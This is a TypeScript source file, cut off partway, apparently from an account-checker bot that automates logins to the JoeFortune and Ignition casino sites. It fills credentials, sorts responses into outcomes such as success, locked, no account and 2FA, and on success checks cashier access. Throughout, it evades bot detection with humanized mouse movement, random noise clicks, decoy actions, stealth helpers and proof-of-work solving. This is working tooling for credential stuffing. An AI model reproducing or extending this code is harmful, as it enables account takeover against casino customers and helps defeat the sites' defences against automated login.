/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-vars, @typescript-eslint/no-misused-promises, no-useless-assignment*/
/**
 * Login flow — single source of truth.
 *
 * This module owns the cross-cutting behavior that JoeFortune and
 * IgnitionCasino share. It exists to remove the duplicated trigger-word
 * rules, the Joe-specific codegen choreography branch, the submit-method
 * switch, and the show-password fallback that used to live in three
 * different code paths inside `engine.ts`.
 *
 * Anything site-agnostic belongs here. Anything that is still truly
 * site-specific is documented as such and stays in the call site that
 * actually needs it.
 */
import { type Page } from "playwright-core";
import fs from "fs";
import path from "path";
import { createLogger } from "../core/logger.js";

const log = createLogger("LoginFlow");
import { gaussianClamped } from "../core/gaussian-rng.js";
import { humanClickAt, humanClickSelector, humanMouseMove } from "../intelligence/mouse-humanizer.js";
import { executeGenerativeDecoys } from "../intelligence/ai-decoy-generator.js";
import { healSelector } from "../hermes/dom-healer.js";
import { persistHealedSelector } from "../hermes/selector-cache.js";
import { getViewportCoordinateMarkdown } from "../intelligence/ai-vision-coordinator.js";
import { handleWicketkeeper } from "../stealth/wicketkeeper-handler.js";
// ── Source-of-truth trigger words ────────────────────────────────────────────
//
// These phrases are the only definitions of the corresponding outcomes. Every
// detection site (the in-page MutationObserver, the post-load classifier, the
// Spider Rest parser) must import them from this table — never re-spell them.
export interface LoginTriggerRule {
  verdict: "authenticator" | "verify-phone" | "pin-misdirection" | "ignition-verification";
  /** Uppercase phrase to match in the page text. */
  upper: string;
  /** Lowercase phrase to match in the page text (for case-insensitive scans). */
  lower: string;
  /** Whether the rule is restricted to a specific site name. */
  site?: "joe" | "ignition";
}

export const LOGIN_TRIGGER_RULES: readonly LoginTriggerRule[] = [
  { verdict: "authenticator", upper: "AUTHENTICATOR", lower: "authenticator" },
  { verdict: "verify-phone", upper: "VERIFY YOUR PHONE", lower: "verify your phone" },
  { verdict: "verify-phone", upper: "+61", lower: "+61" },
  { verdict: "pin-misdirection", upper: "UPDATE YOUR PIN", lower: "update your pin" },
  { verdict: "pin-misdirection", upper: "PIN UPDATE", lower: "pin update" },
  { verdict: "ignition-verification", upper: "LOGIN VERIFICATION", lower: "login verification", site: "ignition" },
] as const;

export const TRIGGER_VERDICT_PRIORITY: readonly LoginTriggerRule["verdict"][] = [
  "authenticator",
  "verify-phone",
  "pin-misdirection",
  "ignition-verification",
] as const;

/**
 * Pure scan: given a body text, return the highest-priority trigger that
 * applies to the current site. Mirrors the priority order in
 * `classifyLoginResponse` so the in-page observer and the post-load
 * classifier always agree.
 */
export function detectLoginTrigger(
  bodyText: string,
  siteName: string | undefined,
): LoginTriggerRule["verdict"] | null {
  const upper = bodyText.toUpperCase();
  for (const verdict of TRIGGER_VERDICT_PRIORITY) {
    for (const rule of LOGIN_TRIGGER_RULES) {
      if (rule.verdict !== verdict) continue;
      if (rule.site && rule.site !== siteName) continue;
      if (upper.includes(rule.upper)) return verdict;
    }
  }
  return null;
}

/**
 * Returns the source script that, when installed via `page.addInitScript`,
 * keeps `window[STATUS_SYM]` in lockstep with the canonical trigger rules.
 * Both Joe and Ignition install this — never hand-rolled copies.
 */
export const STATUS_SYMBOL = "cloak_status" as const;




/**
 * Install the canonical login trigger observer on the given page. Returns
 * true on first install, false on subsequent calls so callers can guard.
 *
 * The site name is captured at install time so the observer script doesn't
 * need to depend on it being passed through init-script args.
 */
export async function installLoginTriggerObserver(
  page: Page,
  args: { successSelector: string; passwordSelector: string; loginPath: string; siteName: string },
): Promise<boolean> {
  if ((page as unknown as AutomatiPage).__canonicalLoginObserverInstalled) return false;
  (page as unknown as AutomatiPage).__canonicalLoginObserverInstalled = true;

  // Site-aware gate: when the site isn't "ignition", drop the ignition-only
  // trigger so a joe page that happens to mention "login verification" in
  // chrome never sets the wrong verdict.
  const siteName = args.siteName;
  await page.addInitScript(
    ({ siteName: sn, successSel, passwordSel, loginPath, triggers }: { siteName: string; successSel: string; passwordSel: string; loginPath: string; triggers: readonly { verdict: string; upper: string; site?: string }[] }) => {
      const STATUS_SYM = Symbol.for("cloak_status");
      (window as unknown as AutomatiWindow)[STATUS_SYM] = null;

      const TRIGGERS = triggers;

      const install = () => {
        if (!document.body) { requestAnimationFrame(install); return; }
        const formChanged = () => {
          const passwordPresent = passwordSel ? !!document.querySelector(passwordSel) : false;
          const currentPath = (location.pathname || "").toLowerCase();
          const urlMoved = loginPath ? currentPath !== loginPath : false;
          return !passwordPresent || urlMoved;
        };
        const findInShadows = (root: any) => {
          if (!root) return;
          
          // Generic scanner removed in favor of strict calibration
          try {
            if (root.querySelector && root.querySelector(successSel)) {
              (window as unknown as AutomatiWindow)[STATUS_SYM] = "success";
              return;
            }
          } catch { /* selector failed on this root */ }
          const raw = (root.textContent || "");
          const upper = raw.toUpperCase();
          if (formChanged()) {
            for (const trigger of TRIGGERS) {
              if (trigger.site && trigger.site !== sn) continue;
              if (upper.includes(trigger.upper)) {
                (window as unknown as AutomatiWindow)[STATUS_SYM] = trigger.verdict;
                return;
              }
            }
          }
          if ((window as unknown as AutomatiWindow)[STATUS_SYM]) return;
          try {
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            let node: any = walker.nextNode();
            while (node) {
              if (node.shadowRoot) findInShadows(node.shadowRoot);
              node = walker.nextNode();
            }
          } catch { /* walker failed — give up this branch */ }
        };
        const observer = new MutationObserver((mutations) => {
          findInShadows(document.body);
          for (const mut of mutations) {
            for (const node of mut.addedNodes) {
              if (node.nodeType === 1) findInShadows(node);
            }
          }
        });
        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
        findInShadows(document.body);
      };
      install();
    },
    { siteName, successSel: args.successSelector, passwordSel: args.passwordSelector, loginPath: args.loginPath, triggers: LOGIN_TRIGGER_RULES },
  );
  return true;
}

// ── Submit method switch ────────────────────────────────────────────────────
//
// `SubmitMethod` is a value in `random-login-actions.ts` — re-export it here
// so callers can `import { executeCanonicalSubmit, SubmitMethod } from …`.
// The actual button-press implementations live below.
import type { SubmitMethod } from "../stealth/random-login-actions.js";

export interface AutomatiWindow extends Window {
  [key: symbol]: any;
  __automatiCookieDismissed?: boolean;
  __automatiSubmitObserverResult?: any;
  __automatiErrorBaseline?: string;
  __hermesMutationTelemetry?: (data: any) => void;
  __automatiCleanupObservers?: () => void;
}

export interface AutomatiPage {
  __canonicalLoginObserverInstalled?: boolean;
  __mousePos?: { x: number; y: number };
  __sessionId?: string;
  evaluate: any;
}

export type { SubmitMethod };

interface CanonicalSubmitInput {
  page: Page;
  submitSelector: string;
  passwordSelector: string;
  method: SubmitMethod;
  /** True on the very first attempt of a credential — use the
   *  engine-wide "enter_in_password" → "click" override regardless of the
   *  configured method. Mirrors the locked-in spec. */
  isFirstAttempt: boolean;
}

/**
 * Single canonical submit switch. The `enter_in_password → click` override
 * is applied here so the call site doesn't have to duplicate it for every
 * site. Method-specific implementations are split into per-method helpers
 * to keep this function readable and to make it trivial to add new methods.
 */
export async function executeCanonicalSubmit(input: CanonicalSubmitInput): Promise<{ method: SubmitMethod }> {
  // Golden Template Rule: Enter Key Exclusivity (with Triple Click Fallback)
  // Form submission MUST primarily use "Enter". If it fails, fallback to triple-click.
  const method: SubmitMethod = input.isFirstAttempt ? "enter_in_password" : "click";
  
  const submitBox = await input.page.locator(input.submitSelector).boundingBox().catch(() => null);
  if (method === "enter_in_password") {
    await pressEnterInPassword(input.page, input.passwordSelector);
  } else {
    await pressClickOnSubmit(input.page, input.submitSelector, submitBox);
  }
  
  return { method };
}

async function pressEnterInPassword(page: Page, passwordSelector: string): Promise<void> {
  // Re-focus password field to ensure Enter targets the login form, not a stale banner (Golden Template Rule §6)
  await page.locator(passwordSelector).focus().catch(() => {});
  await page.click(passwordSelector).catch(() => { });
  await new Promise((r) => setTimeout(r, 200));
  
  await page.keyboard.press("Enter", { delay: 100 });
}

async function pressClickOnSubmit(
  page: Page,
  submitSelector: string,
  submitBox: { x: number; y: number; width: number; height: number } | null,
): Promise<void> {
  if (submitBox) {
    const offsetX = gaussianClamped(0, 1.5, -4, 4);
    const offsetY = gaussianClamped(0, 1.5, -4, 4);
    const cx = submitBox.x + submitBox.width / 2 + offsetX;
    const cy = submitBox.y + submitBox.height / 2 + offsetY;
    await humanMouseMove(page, cx, cy);
    const holdDuration = Math.round(gaussianClamped(120, 50, 40, 350));
    const clickX = Math.round(cx);
    const clickY = Math.round(cy);
    await page.mouse.move(clickX, clickY);
    
    // Single click implementation
    await page.mouse.down();
    await new Promise((r) => setTimeout(r, holdDuration));
    await page.mouse.up();
  } else {
    await humanClickSelector(page, submitSelector, { force: true });
  }
}

export interface UnifiedChoreographyInput {
  page: Page;
  siteName: string;
  selectors: { username: string; password: string; submit: string };
  targetEmail: string;
  password: string;
  attemptIdx: number;
  inputText: (page: Page, selector: string, value: string) => Promise<boolean>;
  simulateAutofill?: (page: Page, emailSel: string, passSel: string, emailVal: string, passVal: string) => Promise<boolean>;
  useVisionCoordinates?: boolean;
  viewport: { width: number; height: number };
  isFreshSession?: boolean;
}

/**
 * Consolidated heal-and-fill helper. Replaces the 3× duplicated pattern of:
 * 1. healSelector → COORD: → humanClickAt → insertText
 * 2. healSelector → CSS selector → inputText → persistHealedSelector
 */
async function healAndFill(
  page: Page,
  description: string,
  value: string,
  siteName: string,
  selectors: { username: string; password: string; submit: string },
  fieldKey: "username" | "password",
  inputText: (page: Page, selector: string, value: string) => Promise<boolean>,
  persistHealed: typeof persistHealedSelector,
): Promise<boolean> {
  const newSel = await healSelector(page, description);
  if (!newSel) return false;

  if (newSel.startsWith("COORD:")) {
    const parts = newSel.replace("COORD:", "").split(",").map(n => Number(n.trim()));
    const x = parts[0];
    const y = parts[1];
    if (x !== undefined && y !== undefined && !isNaN(x) && !isNaN(y)) {
      await humanClickAt(page, x, y).catch(() => {});
      await page.keyboard.type(value, { delay: Math.floor(Math.random() * 30) });
      return true;
    }
    return false;
  }

  // CSS selector heal
  selectors[fieldKey] = newSel;
  const ok = await inputText(page, newSel, value);
  if (ok) persistHealed(siteName, fieldKey, newSel);
  return ok;
}

export async function executeUnifiedLoginChoreography(input: UnifiedChoreographyInput): Promise<{ success: boolean; submitMethod?: SubmitMethod; networkVerdict?: string }> {
  const { page, siteName, selectors, targetEmail, password, attemptIdx, inputText, viewport: vp, useVisionCoordinates } = input;
  let usernameOk = false;
  let passwordOk = false;

  // Blueprint Fast-Loop Rule: Email persists in DOM across retries — skip re-fill on attempts 2+
  if (attemptIdx > 0) {
    usernameOk = true;
  }

  // Rule 11: Non-Blocking Noise (restored per automation.md strict directive)
  // Fire 1 randomized right-click and 1 left-click across the viewport within 50-300ms, non-blocking.
    void (async () => {
    try {
      await new Promise(r => setTimeout(r, Math.random() * 250 + 50));
      const rx = Math.random() * vp.width;
      const ry = Math.random() * vp.height;
      await page.mouse.click(rx, ry, { button: "right" }).catch(() => {});
      await new Promise(r => setTimeout(r, Math.random() * 50 + 50));
      const lx = Math.random() * vp.width;
      const ly = Math.random() * vp.height;
      await page.mouse.click(lx, ly, { button: "left" }).catch(() => {});
    } catch (e) { log.debug?.(`Biometric noise error: ${String(e)}`); }
  })();

  // Early "Remember Me" checkbox activation (async)
    void (async () => {
    try {
      const rememberMeSelectors = [
        'input[type="checkbox"][name*="remember" i]',
        'input[type="checkbox"][id*="remember" i]',
        '[data-testid*="remember" i] input[type="checkbox"]'
      ];
      for (const sel of rememberMeSelectors) {
        const el = await page.waitForSelector(sel, { timeout: 15000, state: "attached" }).catch(() => null);
        if (el) {
          const isChecked = await el.isChecked().catch(() => true);
          if (!isChecked) {
            await el.check({ force: true }).catch(() => {});
            log.debug(`✅ Early Remember Me activated`);
          }
          break;
        }
      }
    } catch (e) { log.debug?.(`Remember Me activation error: ${String(e)}`); }
  })();

  // ── IMMEDIATE CASCADE CMP DISMISSAL (Golden Template — Rule §6) ──────────
  // This 3-tier cascade was proven critical in the golden tile test:
  // stealth/Camoufox failed 100% without it because cookie banners steal focus
  // and intercept Enter keypresses. This runs SYNCHRONOUSLY before credential
  // fill to guarantee the banner is gone. The async watcher below is a safety net.
  //
  // Tier 1: Native JavaScript API
  await page.evaluate(() => {
    try { (window as any).CookieInformation?.submitAllCategories?.(); } catch { /* intentional */ }
  }).catch(() => {});
  // Tier 2: UI Click — try known selectors
  for (const sel of ['.coi-banner__accept', '[data-coi-btn="accept"]', 'button:has-text("ACCEPT ALL")', 'button:has-text("Accept All")', 'button:has-text("Accept")']) {
    try {
      const btn = page.locator(sel).first();
      if (await btn.isVisible({ timeout: 500 }).catch(() => false)) {
        await btn.click({ timeout: 2000 });
        log.info(`✅ Cookie banner dismissed via cascade: ${sel}`);
        break;
      }
    } catch { /* intentional */ }
  }
  // Tier 3: CSS Hide — force-remove any remaining overlays
  await page.evaluate(() => {
    for (const el of document.querySelectorAll('.coi-banner, .coi-consent-banner, [id*="cookie"], [class*="cookie-banner"]')) {
      (el as HTMLElement).style.setProperty('display', 'none', 'important');
    }
  }).catch(() => {});

  // ── ASYNC COOKIE WATCHER (non-blocking, 15s window) ──────────────────────
  // Safety net for late-arriving banners that the cascade above didn't catch.
  // Cookie banners on these sites ALWAYS appear on fresh sessions:
  //   95% arrive between 2-10s after page load
  //    5% arrive after 10s
  // Instead of blocking form fill with a long wait, we fire an async watcher
  // that auto-dismisses the banner the instant it mounts. Form filling
  // proceeds in parallel. A pre-submit gate ensures dismissal before submit.
  let cookieDismissed = !input.isFreshSession; // non-fresh sessions skip entirely
  let cookieDismissPromise: Promise<void> | null = null;

  if (input.isFreshSession) {
    cookieDismissPromise = (async () => {
      try {
        const calibPath = path.join(process.cwd(), "data", "cookie-calibration.json");
        if (!fs.existsSync(calibPath)) return;
        const calibContent = await fs.promises.readFile(calibPath, "utf-8");
        const calib = JSON.parse(calibContent)[siteName];
        if (!calib?.selectorPath) return;

        // 15s covers the full distribution (95% in 2-10s, 5% after 10s)
        const btn = await page.waitForSelector(calib.selectorPath, { state: 'visible', timeout: 15000 }).catch(() => null);
        if (btn) {
          await btn.click({ force: true });
          cookieDismissed = true;
          log.info(`✅ Cookie banner dismissed via exact selector.`);
          return;
        }

        // Text fallback
        let dynamicBtn = await page.getByText(/accept all|allow all|got it|i agree/i).first().boundingBox().catch(() => null);
        if (!dynamicBtn) {
          dynamicBtn = await page.getByRole('button', { name: /accept|agree|allow/i }).first().boundingBox().catch(() => null);
        }
        if (dynamicBtn) {
          await page.mouse.click(dynamicBtn.x + dynamicBtn.width / 2, dynamicBtn.y + dynamicBtn.height / 2);
          cookieDismissed = true;
          log.info(`✅ Cookie dismissed via text match.`);
          return;
        }

        // Blind coordinate fallback
        if (calib.coordinates) {
          await page.mouse.click(calib.coordinates.x, calib.coordinates.y);
          cookieDismissed = true;
          log.debug(`Cookie dismissed via blind coordinates.`);
        }
      } catch (e: unknown) {
        log.warn(`Async cookie watcher failed: ${e instanceof Error ? e.message : String(e)}`);
      }
    })();
  }

  // ── WICKETKEEPER PoW (non-blocking) ────────────────────────────────────
  // Start PoW solving/waiting in parallel with form filling
  const wicketkeeperPromise = handleWicketkeeper(page, siteName).catch((e: any) => {
    log.warn(`Wicketkeeper PoW failed: ${e?.message ?? e}`);
    return null;
  });

  // Blueprint: Email textbox click on attempt 1 only (email persists across retries)
  if (attemptIdx === 0) {
    await page.getByRole("textbox", { name: /E-mail/i }).click({ force: true, timeout: 3000 }).catch(() => { });
  }

  // ── STEP 2: FILL CREDENTIALS (autofill-first, fallback to individual) ──
  // Native Chrome autofill fills both fields simultaneously via native setter
  // injection — no input events, no Tab press, no sequential typing.
  // This is now the PRIMARY path for all attempts, not a 12% random chance.
  if (useVisionCoordinates) {
    // AI Vision coordinate path — fills both fields via pixel coordinates
    log.info(`[AIVision] Requesting Viewport Coordinate Markdown matrix...`);
    const coords = await getViewportCoordinateMarkdown(page);
    if (coords && coords.email && coords.password) {
      log.info(`[AIVision] Translating to absolute pixels...`);
      const ex = Math.round(coords.email.x * vp.width);
      const ey = Math.round(coords.email.y * vp.height);
      const px = Math.round(coords.password.x * vp.width);
      const py = Math.round(coords.password.y * vp.height);
      
      await humanClickAt(page, ex, ey).catch(() => {});
      await page.keyboard.type(targetEmail, { delay: Math.floor(Math.random() * 30) });
      usernameOk = true;

      await humanClickAt(page, px, py).catch(() => {});
      await page.keyboard.type(password, { delay: Math.floor(Math.random() * 30) });
      passwordOk = true;
    } else {
      log.warn(`[AIVision] Coordinate generation failed. Falling back to autofill...`);
    }
  }

  // Primary path: Autofill-style combined fill (both fields in one evaluate)
  if (!usernameOk || !passwordOk) {
    if ((input as unknown as Record<string, any>).simulateAutofill) {
      try {
        const autofillOk = await (input as unknown as Record<string, any>).simulateAutofill(
          page, selectors.username, selectors.password, targetEmail, password
        );
        if (autofillOk) {
          usernameOk = true;
          passwordOk = true;
          log.debug(`Autofill-style combined fill succeeded.`);
        }
      } catch { /* autofill failed — fall through to individual fill */ }
    }
  }

  // Fallback: Individual field fill (only when autofill fails)
  if (!usernameOk) {
    usernameOk = await inputText(page, selectors.username, targetEmail);
    if (!usernameOk) {
      const healed = await healAndFill(page, "Username input field", targetEmail, siteName, selectors, "username", inputText, persistHealedSelector);
      if (healed) usernameOk = true;
    }
  }
  if (!passwordOk) {
    if (usernameOk) await page.keyboard.press("Tab").catch(() => { });
    passwordOk = await inputText(page, selectors.password, password);
    if (!passwordOk) {
      const healed = await healAndFill(page, "Password input field", password, siteName, selectors, "password", inputText, persistHealedSelector);
      if (healed) passwordOk = true;
    }
  }

  // Abort if drift persists
  if (!usernameOk || !passwordOk) {
    // HARDENING 2: Zero-Trust Canvas/DOM Fallback
    log.warn(`[AIVision] DOM interaction failed completely. Engaging Zero-Trust Vision Coordinate Fallback.`);
    const coords = await getViewportCoordinateMarkdown(page);
    if (coords && coords.email && coords.password) {
      const ex = Math.round(coords.email.x * vp.width);
      const ey = Math.round(coords.email.y * vp.height);
      const px = Math.round(coords.password.x * vp.width);
      const py = Math.round(coords.password.y * vp.height);
      
      if (!usernameOk) {
        await humanClickAt(page, ex, ey).catch(() => {});
        await page.keyboard.type(targetEmail, { delay: Math.floor(Math.random() * 30) });
        usernameOk = true;
      }
      if (!passwordOk) {
        await humanClickAt(page, px, py).catch(() => {});
        await page.keyboard.type(password, { delay: Math.floor(Math.random() * 30) });
        passwordOk = true;
      }
    } else {
      log.error(`[AIVision] Zero-Trust Fallback failed. Form cannot be interacted with.`);
      return { success: false };
    }
  }

  // ── STRICT RULE: Unconditionally click Show Password (Rule 14) ──
  await clickShowPasswordCanonical(page, siteName, selectors.password);

  // ── PRE-SUBMIT COOKIE GATE ──────────────────────────────────────────────
  // Rule 15: Cookie notice MUST be dismissed before submit.
  // If the async watcher hasn't resolved yet, wait up to 3s more.
  // The watcher has been running in parallel with form fill (~1-2s elapsed),
  // so banners arriving at 2-4s are already dismissed. This gate catches
  // late arrivals (5-10s+) that the watcher is still waiting on.
  if (cookieDismissPromise && !cookieDismissed) {
    log.debug(`Pre-submit gate: cookie not yet dismissed, waiting...`);
    await Promise.race([
      cookieDismissPromise,
      new Promise(r => setTimeout(r, 3000)),
    ]);
    if (!cookieDismissed) {
      log.debug(`Cookie still not dismissed after gate — proceeding (banner may not have appeared yet).`);
    }
  }

  // ── PRE-SUBMIT WICKETKEEPER GATE ────────────────────────────────────────
  // Rule: Must wait for the PoW token before clicking submit
  if (wicketkeeperPromise) {
    log.debug(`Pre-submit gate: waiting for Wicketkeeper token...`);
    const token = await wicketkeeperPromise;
    if (token) log.debug(`Wicketkeeper token ready: ${token.substring(0, 10)}...`);
  }

  // Clear in-page canonical status before submit
  await page.evaluate(() => {
    const STATUS_SYM = Symbol.for("cloak_status");
    (window as unknown as AutomatiWindow)[STATUS_SYM] = null;
    (window as unknown as AutomatiWindow).__automatiCookieDismissed = false; // reset flag
  }).catch(() => { });

  // 3. Immediate First Submit Attempt (Enter Key)
  if (attemptIdx === 0) {
      const preSubmitUrl = page.url();

      // Set up listeners BEFORE pressing Enter to avoid missing fast responses
      const apiP = page.waitForResponse(
        res => {
          // Only match POST requests to login/API endpoints — not GET asset loads
          const isPost = res.request().method() === 'POST';
          const url = res.url();
          return isPost && (url.includes('/api') || url.includes('/login') || url.includes('/auth') || url.includes('/graphql'));
        },
        { timeout: 1500 }
      ).then(async (res) => {
        const status = res.status();
        let bodyStr = "";
        try { bodyStr = (await res.text()).toLowerCase(); } catch { /* intentional */ }

        let networkVerdict: string | null = null;
        if (status === 403 || bodyStr.includes('<!doctype html>')) networkVerdict = "blocked";
        else if (status === 0 || status >= 500 || bodyStr.includes('captcha')) networkVerdict = "crash";
        else if (status === 428 || bodyStr.includes('mfa_required')) networkVerdict = "2FA";
        else if (status === 200 || status === 201) networkVerdict = "success";
        else if (bodyStr.includes('permanently') || bodyStr.includes('been disabled')) networkVerdict = "disabled";
        else if (bodyStr.includes('temporarily') || bodyStr.includes('locked') || bodyStr.includes('too many')) networkVerdict = "tempdisabled";
        else if (bodyStr.includes('not found') || bodyStr.includes('no account')) networkVerdict = "noaccount";
        else networkVerdict = "incorrect";

        // Cashier Token Validation (Rule 6)
        if (networkVerdict === "success") {
          const cashierRes = await page.evaluate(async () => {
             try {
               const cRes = await fetch('/cashier/deposit', { method: 'GET', redirect: 'follow' });
               return { status: cRes.status, url: cRes.url };
             } catch (e) { console.warn('Cashier validation fetch error:', e); return null; }
          });
          if (cashierRes && (cashierRes.url.includes('/login') || cashierRes.url.includes('/signin'))) {
            networkVerdict = "soft_success_failed_cashier";
          }
        }
        return { type: "post", verdict: networkVerdict };
      }).catch(() => null);
      const navP = page.waitForNavigation(
        { waitUntil: 'domcontentloaded', timeout: 1500 }
      ).then(() => ({ type: "nav", verdict: "success" })).catch(() => null);

      // Fire Enter key press
      await pressEnterInPassword(page, selectors.password);

      // Submit Verification: race the pre-registered listeners + mutation poll
      const mutP = new Promise<{ type: "mutation", verdict: null } | null>(resolve => {
          let cleared = false;
          const interval = setInterval(() => {
              page.evaluate(() => (window as unknown as AutomatiWindow).__automatiSubmitObserverResult?.mutated)
                .then(mutated => { if (mutated && !cleared) { cleared = true; clearInterval(interval); resolve({ type: "mutation", verdict: null }); } })
                .catch(() => { /* page closed — ignore */ });
          }, 50);
          setTimeout(() => { if (!cleared) { cleared = true; clearInterval(interval); resolve(null); } }, 1500);
      });

      const signal = await Promise.race([apiP, navP, mutP]).catch(() => null);

      if (signal && (signal.type === "post" || signal.type === "nav")) {
          // POST detected or full navigation — these are high-confidence signals
          log.debug(`Submit verified via immediate Enter key (signal: ${signal.type}, verdict: ${signal.verdict}).`);
          return { success: signal.verdict === "success", submitMethod: "enter_in_password", networkVerdict: signal.verdict || undefined };
      }

      if (signal && signal.type === "mutation") {
          // Mutation detected — secondary verify: check if URL changed or form is gone
          // Mutations can be false positives (CSS animations, hover effects)
          await new Promise(r => setTimeout(r, 800));
          const urlChanged = page.url() !== preSubmitUrl;
          const formGone = !(await page.locator(selectors.username).isVisible().catch(() => false));
          if (urlChanged || formGone) {
              log.debug(`Submit verified via Enter key + secondary check (url=${urlChanged}, formGone=${formGone}).`);
              return { success: true, submitMethod: "enter_in_password" };
          }
          log.debug(`Enter key mutation was false positive (form still visible). Falling back to Triple Click...`);
      } else {
          log.debug(`Enter key submit not properly completed. Falling back to Triple Click...`);
      }
  }

  // Run generative decoys concurrently as an additional obfuscation layer without blocking the flow
  executeGenerativeDecoys(page).catch(() => {});

  // Force React/Vue state sync via TRUSTED user action (click dead space)
  try {
    await page.mouse.click(vp.width - 10, vp.height - 10);
    await new Promise(r => setTimeout(r, 20)); // tiny wait to ensure blur resolves
  } catch { /* intentional */ }

  // (Show Password fallback was invoked at the STRICT RULE block above)
  // 5. Fallback Submit
  if (attemptIdx === 0) {
      await pressTripleClickOnSubmit(page, selectors.submit);
      return { success: true, submitMethod: "triple_click" };
  } else {
      const submitBox = await page.locator(selectors.submit).boundingBox().catch(() => null);
      await pressClickOnSubmit(page, selectors.submit, submitBox);
      return { success: true, submitMethod: "click" };
  }
}

async function pressTripleClickOnSubmit(page: Page, submitSelector: string): Promise<void> {
    const submitBox = await page.locator(submitSelector).boundingBox().catch(() => null);
    if (submitBox) {
        const cx = submitBox.x + submitBox.width / 2;
        const cy = submitBox.y + submitBox.height / 2;
        await humanMouseMove(page, cx, cy);
        for (let i = 0; i < 3; i++) {
            await page.mouse.down();
            await new Promise(r => setTimeout(r, 40));
            await page.mouse.up();
            await new Promise(r => setTimeout(r, 40));
        }
    } else {
        await humanClickSelector(page, submitSelector, { force: true });
        await new Promise(r => setTimeout(r, 40));
        await humanClickSelector(page, submitSelector, { force: true });
        await new Promise(r => setTimeout(r, 40));
        await humanClickSelector(page, submitSelector, { force: true });
    }
}

// ── Show-password fallback ──────────────────────────────────────────────────
//
// Canonical selector set for every supported site, in priority order. Any
// new "show password" toggle must be appended here — never inline at the
// call site.
export const SHOW_PASSWORD_SELECTORS: { [site: string]: string[] } = {
  joe: [
    "div.ol-inputLeftIconRecipe__rightContent--icon_after > span",
  ],
  ignition: [
    "div.ol-text__rightContent--icon_after > span",
  ],
};

export const GENERIC_SHOW_PASSWORD_SELECTORS: readonly string[] = [
  '[aria-label*="show password" i]',
  '[aria-label*="reveal password" i]',
  '[aria-label*="toggle password" i]',
  '[data-testid*="show-password" i]',
  '[data-testid*="toggle-password" i]',
  "button.show-password",
  "button.toggle-password",
  ".password-toggle",
  ".show-password",
  'button[aria-label*="Show" i]',
  'svg[class*="eye" i]',
  'i[class*="eye" i]',
  '[class*="show-password" i]',
];

/**
 * Click the site's show-password toggle. Returns the selector that
 * succeeded, or null if no toggle could be activated. Site-specific
 * selectors are tried first; the generic set is the fallback.
 */
export async function clickShowPasswordCanonical(
  page: Page,
  siteName: string,
  passwordSelector?: string,
): Promise<string | null> {
  const siteSelectors = SHOW_PASSWORD_SELECTORS[siteName] ?? [];
  const allSelectors = [...siteSelectors, ...GENERIC_SHOW_PASSWORD_SELECTORS];

  const isRevealed = async (): Promise<boolean> => {
    if (!passwordSelector) return true;
    const t = await page.locator(passwordSelector).first().getAttribute("type").catch(() => null);
    return t === "text";
  };

  if (await isRevealed()) return "already_revealed";

  for (const sel of allSelectors) {
    try {
      const btn = page.locator(sel).first();
      if (!(await btn.isVisible({ timeout: 200 }))) continue;
      await btn.click({ timeout: 1000 }).catch(() => { });
      if (await isRevealed()) return sel;
      await btn.dispatchEvent("click").catch(() => { });
      if (await isRevealed()) return sel;
      let ancestor = btn.locator("..");
      for (let depth = 1; depth <= 3; depth++) {
        await ancestor.dispatchEvent("click").catch(() => { });
        if (await isRevealed()) return sel;
        ancestor = ancestor.locator("..");
      }
    } catch { /* selector didn't match — try next */ }
  }
  return null;
}

// ── Cookie banner accept phrases ────────────────────────────────────────────
//
// Both the in-page MutationObserver and the coordinate-calibration script
// scan for these phrases. They live here so neither path can drift.
export const COOKIE_ACCEPT_PHRASES: readonly string[] = [
  "accept all",
  "allow all",
  "accept cookies",
  "i agree",
  "agree",
  "got it",
  "ok",
];

export interface SubmitMutationResult {
  mutated: boolean;
  baselineRestored: boolean;
  initialErrorText: string;
  finalErrorText: string;
  errorVaried: boolean;
}

export async function setupSubmitMutationObserver(page: Page, submitSel: string, emailSel: string) {
  await page.evaluate(({ sSel, eSel }) => {
    (window as unknown as AutomatiWindow).__automatiSubmitObserverResult = null;
    
    const getErrorText = () => {
      const emailEl = document.querySelector(eSel);
      if (!emailEl) return (document.body.textContent || "").toLowerCase();
      let parent = emailEl.parentElement;
      for (let i = 0; i < 4; i++) {
        if (parent && parent.parentElement) parent = parent.parentElement;
      }
      return parent ? (parent.textContent || "").toLowerCase() : (document.body.textContent || "").toLowerCase();
    };

    const initialErrorText = getErrorText();
    (window as unknown as AutomatiWindow).__automatiErrorBaseline = initialErrorText;

    const btn = document.querySelector(sSel);
    if (!btn) return;

    const initialHtml = btn.outerHTML;
    const initialDisabled = (btn as HTMLButtonElement).disabled;

    let hasMutated = false;

    const checkResult = () => {
       const finalErrorText = getErrorText();
       const errorVaried = initialErrorText !== finalErrorText;
       if ((window as unknown as AutomatiWindow).__hermesMutationTelemetry) {
           (window as unknown as AutomatiWindow).__hermesMutationTelemetry?.({
               type: 'error_varied',
               timestamp: Date.now(),
               initialErrorText,
               finalErrorText,
               errorVaried
           });
       }
       (window as unknown as AutomatiWindow).__automatiSubmitObserverResult = {
          mutated: hasMutated,
          baselineRestored: true,
          initialErrorText,
          finalErrorText,
          errorVaried
       };
       if ((window as unknown as AutomatiWindow).__automatiCleanupObservers) {
          (window as unknown as AutomatiWindow).__automatiCleanupObservers?.();
       }
    };

    const observer = new MutationObserver(() => {
       const currentDisabled = (btn as HTMLButtonElement).disabled;
       const currentHtml = btn.outerHTML;
       
       if (currentHtml !== initialHtml || currentDisabled !== initialDisabled) {
         hasMutated = true;
         if ((window as unknown as AutomatiWindow).__hermesMutationTelemetry) {
            (window as unknown as AutomatiWindow).__hermesMutationTelemetry?.({
               type: 'submit_mutated',
               timestamp: Date.now(),
               initialDisabled,
               currentDisabled,
               initialHtmlLen: initialHtml.length,
               currentHtmlLen: currentHtml.length
            });
         }
       }
       
       if (hasMutated) {
         if (!currentDisabled && currentHtml === initialHtml) {
            checkResult();
         } else if (!currentDisabled && currentHtml.includes("Login")) {
            checkResult();
         }
       }
    });

    observer.observe(btn, { attributes: true, childList: true, subtree: true, characterData: true });
    
    const formObserver = new MutationObserver(() => {
        const newText = getErrorText();
        if (newText !== initialErrorText) {
            checkResult();
        }
    });
    
    const formArea = document.querySelector(eSel)?.closest('form') || document.body;
